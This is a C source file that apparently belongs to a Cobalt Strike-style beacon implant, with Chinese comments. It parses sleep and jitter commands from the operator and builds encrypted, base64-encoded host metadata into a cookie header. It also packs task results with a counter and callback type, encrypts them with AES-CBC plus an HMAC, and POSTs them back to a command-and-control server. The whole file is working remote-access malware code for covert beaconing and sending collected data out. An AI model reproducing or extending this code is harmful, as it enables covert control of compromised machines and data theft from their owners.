#include <windows.h>
#include "Command.h"
#include "Http.h"
#pragma warning(disable:4996)

VOID CmdChangSleepTimes(unsigned char* command_buffer, size_t command_length) {
    datap parser;
    BeaconDataParse(&parser, command_buffer, command_length);

    g_sleeptime = BeaconDataInt(&parser);
	g_jitter = BeaconDataInt(&parser);
    if (g_jitter <= 0 || g_jitter > 99)
        g_jitter = 0;
	g_jitter = (g_sleeptime * g_jitter) / 100;
}

VOID FreeEncryptMetadataResult(EncryptMetadataResult* r) {
    if (r && r->EncryptMetadata) {
        free(r->EncryptMetadata);
        r->EncryptMetadata = NULL;
        r->EncryptMetadataLen = 0;
    }
}

wchar_t* makeMetaData() {
    EncryptMetadataResult encrypt_meta_info = encryptMetadata();
    unsigned char* enc_meta_info = encrypt_meta_info.EncryptMetadata;
    size_t EncryptMetaInfolen = encrypt_meta_info.EncryptMetadataLen;

    if (!enc_meta_info || EncryptMetaInfolen <= 0) {
        fprintf(stderr, "encryptMetadata failed\n");
        return NULL;
    }

    unsigned char* base64_enc_meta = base64Encode(enc_meta_info, EncryptMetaInfolen);
	FreeEncryptMetadataResult(&encrypt_meta_info);
    if (!base64_enc_meta) {
		fprintf(stderr, "base64Encode failed\n");
        return NULL;
    }

    size_t headers_length = strlen(g_metadata_header) + strlen(g_metadata_prepend);

    unsigned char* headers_start = (unsigned char*)malloc(headers_length + 1);
    if (!headers_start) {
        fprintf(stderr, "Memory allocation failed\n");
        free(base64_enc_meta);
        return NULL;
    }

    memcpy(headers_start, g_metadata_header, strlen(g_metadata_header));
    memcpy(headers_start + strlen(g_metadata_header), g_metadata_prepend, strlen(g_metadata_prepend));
    headers_start[headers_length] = '\0';

    size_t cookie_length = strlen(headers_start) + strlen(base64_enc_meta);
    unsigned char* cookie_data = (unsigned char*)malloc(cookie_length + 1);
    if (!cookie_data) {
        fprintf(stderr, "Memory allocation failed\n");
        free(headers_start);
        free(base64_enc_meta);
        return NULL;
    }

    snprintf((char*)cookie_data, cookie_length + 1, "%s%s", headers_start, base64_enc_meta);


	free(headers_start);
	free(base64_enc_meta);

    // 先计算宽字符长度（包含结尾 \0）
    int wideLen = MultiByteToWideChar(CP_ACP, 0, (char*)cookie_data, -1, NULL, 0);
    if (wideLen == 0) {
        fprintf(stderr, "MultiByteToWideChar failed with error:%lu\n", GetLastError());
        free(cookie_data);
        return NULL;
    }

    // 分配 wideLen（字符串 + 末尾\0）+ 2（\r \n）+ 1（新的\0）
    wchar_t* wcookie_data = (wchar_t*)malloc((wideLen + 2) * sizeof(wchar_t));
    if (!wcookie_data) {
        fprintf(stderr, "Memory allocation failed\n");
        free(cookie_data);
        return NULL;
    }

    if (MultiByteToWideChar(CP_ACP, 0, (unsigned char*)cookie_data, -1, wcookie_data, wideLen) == 0) {
        fprintf(stderr, "MultiByteToWideChar failed with error:%lu\n", GetLastError());
        free(cookie_data);
        free(wcookie_data);
        return NULL;
    }

    // 追加 CRLF，覆盖原有的 \0
    wcookie_data[wideLen - 1] = L'\r';
    wcookie_data[wideLen] = L'\n';
    wcookie_data[wideLen + 1] = L'\0';

    free(cookie_data);

	return wcookie_data;
}

static BOOL append_data(unsigned char** buf, size_t* buf_length, size_t* buf_capacity, unsigned char* data, size_t dataLen) {
    if (*buf_length + dataLen > *buf_capacity) {
        // 扩容
        *buf_capacity = *buf_length + dataLen + 512; 
        unsigned char* new_buf = (unsigned char*)realloc(*buf, *buf_capacity);
        if (!new_buf) {
            fprintf(stderr, "realloc failed\n");
            free(*buf);
            *buf = NULL;
            return FALSE;
        }
        *buf = new_buf;
    }
    memcpy(*buf + *buf_length, data, dataLen);
    *buf_length += dataLen;
    return TRUE;
}

unsigned char* MakePacket(int callback, unsigned char* post_buffer, size_t post_length, size_t* packet_length) {
    g_counter += 1;

    // 初始缓冲区容量
    size_t buf_capacity = 1024; 
    size_t buf_length = 0;
    unsigned char* buf = (unsigned char*)malloc(buf_capacity);
    if (!buf) {
        fprintf(stderr, "Memory allocation failed\n");
        return NULL;
    }

    // 写入 g_counter（大端 4 Byte）
    uint8_t counter_be[4];
    PutUint32BigEndian(counter_be, (uint32_t)g_counter);

    if (!append_data(&buf, &buf_length, &buf_capacity, counter_be, 4)) {
        fprintf(stderr, "append_data failed for counter_big_endian\n");
        return NULL;
    }

    // 写入结果长度（仅当 post_buffer 存在时）
    if (post_buffer) {
        uint32_t result_total_len = (uint32_t)post_length + 4;

        uint8_t result_len_be[4];
        PutUint32BigEndian(result_len_be, result_total_len);

        if (!append_data(&buf, &buf_length, &buf_capacity, result_len_be, 4)) {
            fprintf(stderr, "append_data failed for result_len_be\n");
            free(buf);
            return NULL;
        }
    }

    // 写入 Callback 类型（大端 4 Byte）
    uint8_t callback_be[4];
    PutUint32BigEndian(callback_be, (uint32_t)callback);

    if (!append_data(&buf, &buf_length, &buf_capacity, callback_be, 4)) {
        fprintf(stderr, "append_data failed for callback_be\n");
        free(buf);
        return NULL;
    }

    // 添加 post_buffer
    if (post_buffer && post_length > 0) {
        if (!append_data(&buf, &buf_length, &buf_capacity, post_buffer, post_length)) {
			fprintf(stderr, "append_data failed for post_buffer\n");
            return NULL;
        }
    }

    size_t cipher_len = 0;

    // AES CBC 加密（输出包含 16 字节 IV + ciphertext）
    unsigned char* cipher_buf = Aes_CBC_Encrypt(buf, g_aeskey, buf_length, &cipher_len);
    free(buf);

    if (!cipher_buf) {
        fprintf(stderr, "Aes_CBC_Encrypt failed\n");
        return NULL;
    }

    // 跳过 16 字节 IV，得到纯 ciphertext 部分
    unsigned char* ciphertext_ptr = cipher_buf + 16;
    size_t ciphertext_len = cipher_len - 16;

    // 构建最终数据包：4字节大端长度 | ciphertext | HMAC(16 Byte)
    uint32_t aes_total_len = (uint32_t)cipher_len;
    size_t packet_len = 4 + ciphertext_len + 16;

    unsigned char* packet_buf = (unsigned char*)malloc(packet_len);
    if (!packet_buf) {
        fprintf(stderr, "Memory allocation failed\n");
        free(cipher_buf);
        return NULL;
    }

    // 写入 AES 加密总长度（大端 4 Byte）
    uint8_t aes_len_be[4];
    PutUint32BigEndian(aes_len_be, aes_total_len);
    memcpy(packet_buf, aes_len_be, 4);

    // 写入加密后的 ciphertext
    memcpy(packet_buf + 4, ciphertext_ptr, ciphertext_len);

    // 计算并写入 HMAC（16 Byte）
    unsigned char* hmac_buf = HMkey(ciphertext_ptr, ciphertext_len);
    memcpy(packet_buf + 4 + ciphertext_len, hmac_buf, 16);

    *packet_length = packet_len;

    free(hmac_buf);
    free(cipher_buf);

    return packet_buf;
}

VOID DataProcess(unsigned char* post_buffer, size_t post_length, int callbackType) {
    unsigned char* beacon_id_header = make_beacon_id_header();
    unsigned char* post_data = make_post_data(post_buffer, post_length, callbackType);
    size_t post_data_length = strlen(post_data);

	wchar_t* beacon_id_wheader = convert_2_wchar(beacon_id_header);

    POST(post_data, post_data_length, beacon_id_wheader);
	free(post_data);
    free(beacon_id_header);
}